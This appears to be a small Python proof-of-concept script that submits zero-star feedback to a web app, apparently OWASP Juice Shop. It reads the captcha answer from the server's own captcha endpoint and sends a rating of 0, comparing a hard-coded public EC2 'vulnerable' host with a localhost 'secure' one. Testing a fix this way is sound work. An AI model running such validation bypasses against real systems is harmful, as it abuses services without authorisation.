import requests
from pprint import pprint


def req(url: str, json: dict = None) -> dict:
    if json is not None:
        print(f"POST {url}")
        pprint(json)
        resp = requests.post(url=url, json=json)
    else:
        print(f"GET {url}")
        resp = requests.get(url=url)
    print(f"Response: {resp.status_code}")
    try:
        resp = resp.json()
        pprint(resp)
        return resp
    except:
        return None


def zero_star(host):
    captcha = req(url=f"{host}/rest/captcha/")
    req(
        url=f"{host}/api/Feedbacks/",
        json={

            "captchaId": captcha['captchaId'],
            "captcha": captcha['answer'],
            "comment": "Zero star test",
            "rating": 0
        }
    )


if __name__ == '__main__':
    vulnerable_host = "http://ec2-34-215-113-110.us-west-2.compute.amazonaws.com"
    secure_host = "http://localhost:3000"

    print("----> INSECURE")
    zero_star(vulnerable_host)
    print()

    print("----> SECURE")
    zero_star(secure_host)